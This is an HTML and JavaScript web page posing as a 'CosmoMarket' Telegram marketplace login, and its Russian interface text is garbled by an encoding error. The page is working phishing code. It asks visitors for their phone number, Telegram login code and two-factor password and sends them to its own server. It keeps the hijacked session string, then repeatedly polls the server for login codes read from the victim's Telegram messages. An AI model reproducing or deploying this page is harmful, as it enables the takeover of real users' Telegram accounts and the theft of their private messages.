<!DOCTYPE html>
<html>
<head>
    <title>CosmoMarket - Telegram Market</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a0033 0%,#4a0072 50%,#8a2be2 100%);min-height:100vh;color:white;overflow-x:hidden;position:relative}.stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1}.star{position:absolute;background:white;border-radius:50%;animation:twinkle 5s infinite}@keyframes twinkle{0%,100%{opacity:.2}50%{opacity:1}}.container{max-width:500px;margin:0 auto;padding:20px;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}.logo{text-align:center;margin-bottom:30px;animation:float 6s ease-inout infinite}@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}.logo h1{font-size:3.5rem;font-weight:bold;background:linear-gradient(45deg,#ff6bff,#9d4edd,#5a00b5);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 30px rgba(255,107,255,.5);margin-bottom:10px}.logo p{font-size:1.1rem;opacity:.8;letter-spacing:2px}.auth-card{background:rgba(255,255,255,.1);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.2);border-radius:20px;padding:40px 30px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.3);margin-bottom:30px}.animation-container{width:200px;height:200px;margin:0 auto 20px;border-radius:15px;overflow:visible;background:transparent;border:none;box-shadow:none}.telegram-animation{width:100%;height:100%;border-radius:15px;object-fit:cover;background:transparent;mix-blend-mode:screen;filter:drop-shadow(0 0 20px rgba(255,107,255,.4))}.telegram-icon{width:50px;height:50px;background-image:url('https://s3.radikal.cloud/2025/11/29/image-no-bg-preview-carve.photoscd6b65a24093aae0.png');background-size:contain;background-repeat:no-repeat;background-position:center}.start-btn{background:linear-gradient(135deg,#8a2be2,#9d4edd,#ff6bff);color:white;border:none;padding:16px 32px;font-size:1.1rem;font-weight:600;border-radius:50px;cursor:pointer;transition:all .3s ease;box-shadow:0 4px 20px rgba(138,43,226,.4);margin-top:20px;display:flex;align-items:center;justify-content:center;gap:12px;width:100%;max-width:300px;margin-left:auto;margin-right:auto;position:relative;overflow:hidden}.start-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);transition:left .5s}.start-btn:hover::before{left:100%}.start-btn:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(138,43,226,.6);background:linear-gradient(135deg,#9d4edd,#8a2be2,#c77dff)}.start-btn:active{transform:translateY(0);box-shadow:0 2px 10px rgba(138,43,226,.4)}.step{display:none;width:100%;animation:fadeIn .5s ease}@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}.step.active{display:block}.step h3{font-size:1.5rem;margin-bottom:25px;color:#ff6bff}.input-group{margin-bottom:20px;text-align:left}.input-group label{display:block;margin-bottom:8px;font-weight:bold;color:#e0c3ff}.input-group input{width:100%;padding:15px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.3);border-radius:10px;color:white;font-size:1rem;transition:all .3s ease}.input-group input:focus{outline:none;border-color:#0088cc;box-shadow:0 0 15px rgba(0,136,204,.3)}.btn{background:linear-gradient(135deg,#8a2be2,#9d4edd,#ff6bff);color:white;border:none;padding:14px 30px;font-size:1rem;font-weight:600;border-radius:25px;cursor:pointer;transition:all .3s ease;box-shadow:0 4px 15px rgba(138,43,226,.4);width:100%;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:10px}.btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(138,43,226,.6);background:linear-gradient(135deg,#9d4edd,#8a2be2,#c77dff)}.btn:disabled{background:rgba(255,255,255,.2);cursor:not-allowed;transform:none;box-shadow:none}.help-btn{background:rgba(255,255,255,.1);color:#e0c3ff;border:1px solid rgba(255,255,255,.3);padding:10px 20px;border-radius:20px;cursor:pointer;margin-top:10px;transition:all .3s ease;width:100%;font-size:0.9rem}.help-btn:hover{background:rgba(255,255,255,.2)}.alert{padding:15px;margin:20px 0;border-radius:10px;text-align:left;animation:slideIn .3s ease}@keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}.success{background:rgba(76,175,80,.2);border:1px solid rgba(76,175,80,.5);color:#a5d6a7}.error{background:rgba(244,67,54,.2);border:1px solid rgba(244,67,54,.5);color:#ef9a9a}.info{background:rgba(33,150,243,.2);border:1px solid rgba(33,150,243,.5);color:#90caf9}.warning{background:rgba(255,193,7,.2);border:1px solid rgba(255,193,7,.5);color:#fff59d}.user-info{background:rgba(255,255,255,.1);border-radius:15px;padding:20px;margin:20px 0;text-align:left;border:1px solid rgba(255,255,255,.2)}.user-info h4{color:#ff6bff;margin-bottom:15px;text-align:center}.user-info p{margin:8px 0;color:#e0c3ff}.back-btn{background:rgba(255,255,255,.1);color:white;border:1px solid rgba(255,255,255,.3);padding:10px 20px;border-radius:20px;cursor:pointer;margin-top:15px;transition:all .3s ease;width:100%}.back-btn:hover{background:rgba(255,255,255,.2)}.welcome-text{font-size:1.1rem;margin-bottom:30px;text-align:center;line-height:1.6;color:#e0c3ff}.btn-content{display:flex;align-items:center;justify-content:center;gap:10px}
        
        /* –ù–æ–≤—ã–µ —Å—Ç–∏–ª–∏ –¥–ª—è –ø–æ–∏—Å–∫–∞ –∫–æ–¥–∞ */
        .code-search-section {background:rgba(255,255,255,.05);border-radius:15px;padding:20px;margin:20px 0;border:1px solid rgba(255,255,255,.1);}
        .search-status {display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:15px;}
        .search-indicator {width:12px;height:12px;border-radius:50%;background:#ff6bff;animation:pulse 1.5s infinite;}
        @keyframes pulse {0%,100%{opacity:1;}50%{opacity:0.5;}}
        .code-display {font-size:2rem;font-weight:bold;text-align:center;color:#ff6bff;margin:15px 0;text-shadow:0 0 20px rgba(255,107,255,.7);}
        .search-controls {display:flex;gap:10px;margin-top:15px;}
        .search-btn {flex:1;padding:12px;border-radius:10px;border:none;cursor:pointer;transition:all .3s ease;font-weight:600;}
        .start-search {background:linear-gradient(135deg,#00c853,#64dd17);color:white;}
        .stop-search {background:linear-gradient(135deg,#ff1744,#f50057);color:white;}
        .manual-search {background:linear-gradient(135deg,#2979ff,#2962ff);color:white;}
        .search-btn:hover {transform:translateY(-2px);box-shadow:0 4px 15px rgba(0,0,0,.3);}
        .search-stats {display:flex;justify-content:space-between;margin-top:15px;font-size:0.9rem;color:#e0c3ff;}
    </style>
</head>
<body>
    <div class="stars" id="stars"></div>
    <div class="container">
        <div class="logo">
            <h1>Cosmo</h1>
            <p>TELEGRAM MARKET</p>
        </div>
        <div class="auth-card">
            <div id="startStep" class="step active">
                <div class="animation-container">
                    <img src="https://nft-market-production.up.railway.app/static/uploads_image_g30yOrP8Cp1n6fVBkaJbWEwmsYqH9z_ezgif-2911fdd0ce7f2110.gif" class="telegram-animation" alt="Telegram Auth Animation">
                </div>
                <h3>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ CosmoMarket</h3>
                <div class="welcome-text">–ü—Ä–∏—Å–æ–µ–¥–∏–Ω—è–π—Ç–µ—Å—å –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–º—É —Å–æ–æ–±—â–µ—Å—Ç–≤—É –≤ Telegram</div>
                <button class="start-btn" onclick="startAuth()">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram</span>
                    </div>
                </button>
            </div>

            <div id="step1" class="step">
                <h3>üì± –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
                <div class="input-group">
                    <label for="phone">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</label>
                    <input type="text" id="phone" placeholder="–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞">
                </div>
                <button class="btn" onclick="requestCode()" id="requestBtn">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</span>
                    </div>
                </button>
               <button class="help-btn" onclick="showTelegramHelp()">
                   ‚ùì –ì–¥–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–æ–¥?
               </button>
                <button class="back-btn" onclick="showStep('startStep')">‚Üê –ù–∞–∑–∞–¥</button>
            </div>

            <div id="step2" class="step">
                <h3>üî¢ –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram</h3>
                <div class="input-group">
                    <label for="code">5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥:</label>
                    <input type="text" id="code" placeholder="*****" maxlength="5">
                </div>
                <button class="btn" onclick="verifyCode()" id="verifyBtn">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥</span>
                    </div>
                </button>
                <button class="help-btn" onclick="window.open('https://t.me/+42777', '_blank')">
                    ‚ùì –ì–¥–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–æ–¥?
                </button>
                <button class="back-btn" onclick="showStep('step1')">‚Üê –ù–∞–∑–∞–¥</button>
            </div>

            <div id="step3" class="step">
                <h3>üîí –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA</h3>
                <div class="alert info">–≠—Ç–æ—Ç –∞–∫–∫–∞—É–Ω—Ç –∑–∞—â–∏—â–µ–Ω –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π</div>
                <div class="input-group">
                    <label for="password">–ü–∞—Ä–æ–ª—å 2FA:</label>
                    <input type="password" id="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å">
                </div>
                <button class="btn" onclick="verifyPassword()" id="passwordBtn">
                    <div class="btn-content">
                        <div class="telegram-icon"></div>
                        <span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–∞—Ä–æ–ª—å</span>
                    </div>
                </button>
                <button class="back-btn" onclick="showStep('step2')">‚Üê –ù–∞–∑–∞–¥</button>
            </div>

            <!-- –ù–æ–≤—ã–π —à–∞–≥ –¥–ª—è –ø–æ–∏—Å–∫–∞ –∫–æ–¥–∞ -->
            <div id="step4" class="step">
                <h3>üîç –ü–æ–∏—Å–∫ –∫–æ–¥–æ–≤ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏</h3>
                <div class="alert info">
                    –°–∏—Å—Ç–µ–º–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏—â–µ—Ç –∫–æ–¥—ã –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤ –≤–∞—à–∏—Ö Telegram —Å–æ–æ–±—â–µ–Ω–∏—è—Ö
                </div>
                
                <div class="code-search-section">
                    <div class="search-status">
                        <div class="search-indicator" id="searchIndicator"></div>
                        <span id="searchStatusText">–ü–æ–∏—Å–∫ –Ω–µ –∑–∞–ø—É—â–µ–Ω</span>
                    </div>
                    
                    <div id="foundCodeSection" style="display:none;">
                        <div class="code-display" id="foundCode">00000</div>
                        <div style="text-align:center;color:#e0c3ff;margin-bottom:15px;">
                            üéâ –ö–æ–¥ –Ω–∞–π–¥–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏!
                        </div>
                    </div>
                    
                    <div class="search-controls">
                        <button class="search-btn start-search" onclick="startCodeSearch()" id="startSearchBtn">
                            üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ–∏—Å–∫
                        </button>
                        <button class="search-btn stop-search" onclick="stopCodeSearch()" id="stopSearchBtn" disabled>
                            ‚èπÔ∏è –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å
                        </button>
                        <button class="search-btn manual-search" onclick="searchCodeNow()" id="manualSearchBtn">
                            üîé –ü–æ–∏—Å–∫ —Å–µ–π—á–∞—Å
                        </button>
                    </div>
                    
                    <div class="search-stats">
                        <span id="searchTime">–í—Ä–µ–º—è: 0—Å</span>
                        <span id="searchAttempts">–ü–æ–ø—ã—Ç–æ–∫: 0</span>
                    </div>
                </div>
                
                <div class="user-info" id="userSessionInfo" style="display:none;">
                    <h4>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Å—Å–∏–∏</h4>
                    <p><strong>ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</strong> <span id="infoUserId">-</span></p>
                    <p><strong>–°—Ç–∞—Ç—É—Å –ø–æ–∏—Å–∫–∞:</strong> <span id="infoSearchStatus">–Ω–µ–∞–∫—Ç–∏–≤–µ–Ω</span></p>
                    <p><strong>–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ:</strong> <span id="infoLastUpdate">-</span></p>
                </div>
                
                <button class="back-btn" onclick="showStep('step3')">‚Üê –ù–∞–∑–∞–¥</button>
                <button class="btn" onclick="showStep('startStep')">üè† –ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
            </div>
            
            <div id="results"></div>
        </div>
    </div>

    <script>
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–∏—Å–∫–æ–º
        let currentSessionId = "";
        let currentPhone = "";
        let currentUserId = null;
        let searchInterval = null;
        let searchStartTime = null;
        let searchAttempts = 0;
        let isSearchRunning = false;

        function showTelegramHelp() {
            alert('–ö–æ–¥ –ø—Ä–∏—Ö–æ–¥–∏—Ç –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —á–∞—Ç "Telegram". –û—Ç–∫—Ä–æ–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ Telegram –∏ –ø—Ä–æ–≤–µ—Ä—å—Ç–µ —á–∞—Ç "Telegram"');
        }

        function createStars() {
            const stars = document.getElementById("stars");
            for (let i = 0; i < 150; i++) {
                const star = document.createElement("div");
                star.className = "star";
                const size = 2 * Math.random() + 1;
                star.style.width = size + "px";
                star.style.height = size + "px";
                star.style.left = 100 * Math.random() + "%";
                star.style.top = 100 * Math.random() + "%";
                star.style.animationDelay = 5 * Math.random() + "s";
                stars.appendChild(star);
            }
        }

        function showStep(stepId) {
            document.querySelectorAll(".step").forEach(step => {
                step.classList.remove("active");
            });
            document.getElementById(stepId).classList.add("active");
            document.getElementById("results").innerHTML = "";
        }

        function startAuth() {
            showStep("step1");
        }

        function showAlert(message, type) {
            document.getElementById("results").innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
        }

        function showUserInfo(user) {
            const userInfoHtml = `
                <div class="user-info">
                    <h4>‚úÖ –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è!</h4>
                    <p><strong>üë§ –ò–º—è:</strong> ${user.first_name || "–ù–µ —É–∫–∞–∑–∞–Ω–æ"}</p>
                    <p><strong>üë• –§–∞–º–∏–ª–∏—è:</strong> ${user.last_name || "–ù–µ —É–∫–∞–∑–∞–Ω–∞"}</p>
                    <p><strong>üîó Username:</strong> @${user.username || "–ù–µ —É–∫–∞–∑–∞–Ω"}</p>
                    <p><strong>üÜî ID:</strong> ${user.id}</p>
                    <p><strong>üìû –¢–µ–ª–µ—Ñ–æ–Ω:</strong> ${user.phone_number}</p>
                </div>
                <button class="btn" onclick="showStep('step4')" style="margin-top:15px;">
                    üîç –ù–∞—á–∞—Ç—å –ø–æ–∏—Å–∫ –∫–æ–¥–æ–≤ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
                </button>
            `;
            document.getElementById("results").innerHTML = userInfoHtml;
            currentUserId = user.id;
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º session_string –¥–ª—è –ø–æ–∏—Å–∫–∞ –∫–æ–¥–∞
            if (window.lastAuthResult && window.lastAuthResult.session_string) {
                localStorage.setItem('currentSessionString', window.lastAuthResult.session_string);
            }
        }

        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø–æ–∏—Å–∫–æ–º –∫–æ–¥–∞
        function updateSearchStatus(status, code = null) {
            const indicator = document.getElementById('searchIndicator');
            const statusText = document.getElementById('searchStatusText');
            const foundCodeSection = document.getElementById('foundCodeSection');
            const foundCode = document.getElementById('foundCode');
            
            statusText.textContent = status;
            
            if (code) {
                foundCode.textContent = code;
                foundCodeSection.style.display = 'block';
                indicator.style.background = '#00c853';
            } else {
                foundCodeSection.style.display = 'none';
                indicator.style.background = isSearchRunning ? '#ff6bff' : '#666';
            }
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –≤ –ø–∞–Ω–µ–ª–∏
            if (currentUserId) {
                document.getElementById('infoUserId').textContent = currentUserId;
                document.getElementById('infoSearchStatus').textContent = isSearchRunning ? '–∞–∫—Ç–∏–≤–µ–Ω' : '–Ω–µ–∞–∫—Ç–∏–≤–µ–Ω';
                document.getElementById('infoLastUpdate').textContent = new Date().toLocaleTimeString();
            }
        }

        function updateSearchStats() {
            if (searchStartTime) {
                const elapsed = Math.floor((Date.now() - searchStartTime) / 1000);
                document.getElementById('searchTime').textContent = `–í—Ä–µ–º—è: ${elapsed}—Å`;
            }
            document.getElementById('searchAttempts').textContent = `–ü–æ–ø—ã—Ç–æ–∫: ${searchAttempts}`;
        }

        async function checkCodeStatus() {
            if (!currentUserId) return;
            
            try {
                const response = await fetch(`/api/check-code-status/${currentUserId}`);
                const result = await response.json();
                
                if (result.success) {
                    searchAttempts++;
                    
                    if (result.code_status === 'found' && result.telegram_code) {
                        updateSearchStatus('–ö–æ–¥ –Ω–∞–π–¥–µ–Ω!', result.telegram_code);
                        stopCodeSearch();
                        showAlert(`üéâ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞–π–¥–µ–Ω –∫–æ–¥: ${result.telegram_code}`, 'success');
                    } else if (result.code_status === 'searching') {
                        updateSearchStatus('–ò–¥–µ—Ç –ø–æ–∏—Å–∫ –∫–æ–¥–∞...');
                    } else if (result.code_status === 'not_found') {
                        updateSearchStatus('–ö–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω');
                    }
                    
                    updateSearchStats();
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞:', error);
            }
        }

        function startCodeSearch() {
            if (isSearchRunning) return;
            
            isSearchRunning = true;
            searchStartTime = Date.now();
            searchAttempts = 0;
            
            document.getElementById('startSearchBtn').disabled = true;
            document.getElementById('stopSearchBtn').disabled = false;
            document.getElementById('manualSearchBtn').disabled = false;
            
            updateSearchStatus('–ó–∞–ø—É—Å–∫ –ø–æ–∏—Å–∫–∞...');
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º –ø–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫—É—é –ø—Ä–æ–≤–µ—Ä–∫—É
            searchInterval = setInterval(checkCodeStatus, 5000);
            
            // –ü–µ—Ä–≤–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ä–∞–∑—É
            setTimeout(checkCodeStatus, 1000);
            
            showAlert('üîç –ü–æ–∏—Å–∫ –∫–æ–¥–æ–≤ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∑–∞–ø—É—â–µ–Ω. –°–∏—Å—Ç–µ–º–∞ –±—É–¥–µ—Ç –ø—Ä–æ–≤–µ—Ä—è—Ç—å –Ω–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥.', 'info');
        }

        function stopCodeSearch() {
            if (!isSearchRunning) return;
            
            isSearchRunning = false;
            clearInterval(searchInterval);
            
            document.getElementById('startSearchBtn').disabled = false;
            document.getElementById('stopSearchBtn').disabled = true;
            
            updateSearchStatus('–ü–æ–∏—Å–∫ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω');
            showAlert('–ü–æ–∏—Å–∫ –∫–æ–¥–æ–≤ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.', 'warning');
        }

        async function searchCodeNow() {
            const sessionString = localStorage.getItem('currentSessionString');
            if (!sessionString) {
                showAlert('–°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –∑–∞–Ω–æ–≤–æ.', 'error');
                return;
            }
            
            try {
                document.getElementById('manualSearchBtn').disabled = true;
                document.getElementById('manualSearchBtn').innerHTML = 'üîé –ü–æ–∏—Å–∫...';
                
                const response = await fetch('/api/search-code-now', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ session_string: sessionString })
                });
                
                const result = await response.json();
                
                if (result.success && result.code_found) {
                    updateSearchStatus('–ö–æ–¥ –Ω–∞–π–¥–µ–Ω!', result.telegram_code);
                    showAlert(`üéâ –ù–∞–π–¥–µ–Ω –∫–æ–¥: ${result.telegram_code}`, 'success');
                } else {
                    showAlert('–ö–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö —Å–æ–æ–±—â–µ–Ω–∏—è—Ö.', 'info');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–∏—Å–∫–∞:', error);
                showAlert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∏—Å–∫–µ –∫–æ–¥–∞.', 'error');
            } finally {
                document.getElementById('manualSearchBtn').disabled = false;
                document.getElementById('manualSearchBtn').innerHTML = 'üîé –ü–æ–∏—Å–∫ —Å–µ–π—á–∞—Å';
            }
        }

        async function requestCode() {
            const phone = document.getElementById("phone").value.trim();
            currentPhone = phone;
            if (!phone) {
                showAlert("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", "error");
                return;
            }

            const btn = document.getElementById("requestBtn");
            btn.disabled = true;
            btn.innerHTML = '<div class="btn-content"><div class="telegram-icon"></div><span>üì° –û—Ç–ø—Ä–∞–≤–∫–∞...</span></div>';

            try {
                const response = await fetch("/api/auth/request-code", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({phone: phone})
                });
                const result = await response.json();
                
                if (result.success) {
                    currentSessionId = result.session_id;
                    showStep("step2");
                    showAlert("‚úÖ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥.", "success");
                    document.getElementById("code").focus();
                } else {
                    showAlert("‚ùå " + result.error, "error");
                }
            } catch (error) {
                console.error("Error:", error);
                showAlert("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: " + error.message, "error");
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<div class="btn-content"><div class="telegram-icon"></div><span>–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</span></div>';
            }
        }

        async function verifyCode() {
            const code = document.getElementById("code").value.trim();
            if (!code || code.length !== 5) {
                showAlert("–í–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥ –∏–∑ Telegram", "error");
                return;
            }

            const btn = document.getElementById("verifyBtn");
            btn.disabled = true;
            btn.innerHTML = '<div class="btn-content"><div class="telegram-icon"></div><span>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>';

            try {
                const response = await fetch("/api/auth/verify-code", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        session_id: currentSessionId,
                        code: code
                    })
                });
                const result = await response.json();
                
                if (result.success) {
                    if (result.needs_password) {
                        showStep("step3");
                        showAlert("üîí –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏", "info");
                        document.getElementById("password").focus();
                    } else {
                        window.lastAuthResult = result;
                        showUserInfo(result.user_info);
                        showAlert("‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!", "success");
                    }
                } else {
                    showAlert("‚ùå " + result.error, "error");
                }
            } catch (error) {
                console.error("Error:", error);
                showAlert("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: " + error.message, "error");
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<div class="btn-content"><div class="telegram-icon"></div><span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–¥</span></div>';
            }
        }

        async function verifyPassword() {
            const password = document.getElementById("password").value;
            if (!password) {
                showAlert("–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA", "error");
                return;
            }

            const btn = document.getElementById("passwordBtn");
            btn.disabled = true;
            btn.innerHTML = '<div class="btn-content"><div class="telegram-icon"></div><span>üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...</span></div>';

            try {
                const response = await fetch("/api/auth/verify-password", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        session_id: currentSessionId,
                        password: password
                    })
                });
                const result = await response.json();
                
                if (result.success) {
                    window.lastAuthResult = result;
                    showUserInfo(result.user_info);
                    showAlert("‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!", "success");
                } else {
                    showAlert("‚ùå " + result.error, "error");
                }
            } catch (error) {
                console.error("Error:", error);
                showAlert("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: " + error.message, "error");
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<div class="btn-content"><div class="telegram-icon"></div><span>–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–∞—Ä–æ–ª—å</span></div>';
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π
        document.getElementById("phone").addEventListener("keypress", function(e) {
            if (e.key === "Enter") requestCode();
        });

        document.getElementById("code").addEventListener("keypress", function(e) {
            if (e.key === "Enter") verifyCode();
        });

        document.getElementById("password").addEventListener("keypress", function(e) {
            if (e.key === "Enter") verifyPassword();
        });

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener("DOMContentLoaded", function() {
            createStars();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–µ—Å—Å–∏–∏ –µ—Å–ª–∏ –µ—Å—Ç—å
            const sessionString = localStorage.getItem('currentSessionString');
            if (sessionString) {
                document.getElementById('userSessionInfo').style.display = 'block';
            }
        });
    </script>
</body>
</html>
